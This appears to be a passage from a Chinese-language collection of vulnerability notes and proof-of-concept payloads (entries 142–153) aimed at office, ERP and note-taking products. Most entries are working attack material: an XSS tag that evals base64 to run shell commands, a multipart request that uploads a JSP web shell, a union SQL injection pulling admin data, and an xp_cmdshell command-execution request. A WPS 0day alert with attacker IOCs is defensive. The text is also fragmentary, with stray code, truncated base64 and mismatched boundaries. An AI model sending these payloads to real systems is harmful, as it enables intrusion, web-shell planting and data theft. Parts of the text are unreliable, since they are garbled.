24 agent.error_log("get python version info error:" ..
25 tostring(ret))
26 return ""
27 end
28 end
29 end
142. 幕布笔记rce
1 <img src=x onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N
2 ZG91dCwgc3RkZXJyKT0+ewphbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsgCn0pOw==`,`base64`).
143. Google Chrome V8 类型混淆漏洞 (CVE-2023-3079)
https://github.com/mistymntncop/CVE-2023-3079
144. WPS Office 远程代码执⾏漏洞（0day）
WPS Office 再曝未公开远程命令执⾏漏洞，攻击者可利⽤进⾏在野攻击。
攻击者可利⽤该漏洞⽣成恶意⽂档，受害者只需打开⽂档，⽆需其他任何操作，即可执⾏恶意代码，
进⽽完全控制主机。
经过紧急分析，该漏洞影响最新版 WPS Office，受影响的终端可能超过百万，⽬前官 ⽅尚未修复，属
于在野 0day 状态。该漏洞配合钓⻥等场景危害极⼤
【防护建议】
1、使⽤如下 IOC 进⾏检测:
http://39.105.138.249/wpsauthhttp://39.105.138.249/qingbangong.json
http://39.105.138.249/chuangkit.json
http://39.105.138.249/tutorial.html
http://39.105.138.249/symsrv.dll
http://39.105.138.249/EqnEdit.exe
123.57.150.145/tutorial.html
123.57.150.145/qingbangong.json
123.57.150.145/chuangkit.json
182.92.111.169/tutorial.html
39.105.128.11/tutorial.html
123.57.129.70:443
123.57.129.70:80
safetyitsm.s3-us-east-1.ossfiles.com hbf3heeztt3rrwgmccao.oss-cn-shenzhen.aliyuncs.com
76z1xwz6mp5fq7qi4telphdn0c0.oss-cn-shenzhen.aliyuncs.com 123.56.0.10:80
182.92.111.169:80
182.92.165.230:443 6e8t0xobdnmerpraecktu1bge1kmo1cs.oss-cn-shenzhen.aliyuncs.com
a9ptecut5z3vv7w1o489z.oss-cn-shenzhen.aliyuncs.com
2、建议内部进⾏钓⻥⻛险提醒，不要点击来源不明的⽂件，如条件允许，建议通过终端管理系统暂时
禁⽤或删除WPS软件。
145. 易宝OA ExecuteSqlForSingle SQL注⼊漏洞
易宝OA是⼀款功能⾮常全⾯的移动办公软件。该软件存在SQL注⼊漏洞，攻击者可以获取数据库权限
以获取更多敏感信息。
146. HotGo存在默认⼝令
HotGo 是⼀个基于 vue 和 goframe2.0 开发的全栈前后端分离的开发基础平台和移动应⽤平台。该平
台存在默认密码。
147. SolidUI存在默认⼝令
SolidUI是⼀个AI⽣成可视化原型设计和编辑平台，⽀持2D，3D模型，结合LLM(Large Language
Model) 快速编辑。该平台存在默认密码。
148. Richmail 邮件系统未授权访问获取管理员密码Richmail是亚太本⼟最⼤的电⼦邮件系统提供商之⼀，是新⼀代智慧企业云邮件系统。Richmail存在
未授权访问获取管理员密码漏洞
149. Lexmark远程代码执⾏漏洞(CVE-2023-26067)
Lexmark是美国的⼀系列打印机。Lexmark设备的⼀个受信任的内部组件存在输⼊验证漏洞。已经破
坏了设备的攻击者可以利⽤此漏洞来升级权限。 Certain Lexmark devices 2023-02-19版本及之前版
本存在安全漏洞，该漏洞源于Lexmark设备错误处理输⼊验证。150. 万⼾协同办公平台存在未授权访问漏洞
1 GET /defaultroot/evoInterfaceServlet?paramType=user
151. 万⼾协同办公平台接⼝存在⽂件上传漏洞
POST
/defaultroot/wpsservlet?
option=saveNewFile&newdocld=jsp&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
Host:xxx.xxx.xxx.xxx
User-Agent:
Content-Length:266
Cache-Control:max-age=0
Content-Type:multipart/form-data;boundary=803e058d60f347f7b3c17fa95228eca6
Accept-Encoding: gzip,deflate
Connection:close
--221e166d60f34112b3c17fa95818ecfeContent-Disposition:form-data;name="NewFile";filename="jsp.jsp"
<% jsp 上传的⽊⻢地址 %>
--221e166d60f34112b3c17fa95818ecfe--
152. ⽤友时空KSOA servletimagefield⽂件sKeyvalue参数SQL注⼊漏洞
GET
/servlet/imagefield?
key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+
union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))-
-+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection:
153. 企望制造ERP comboxstore远程命令执⾏漏洞
POST /mainFunctions/comboxstore.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: xxx.xxx.xxx.xxx
comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'
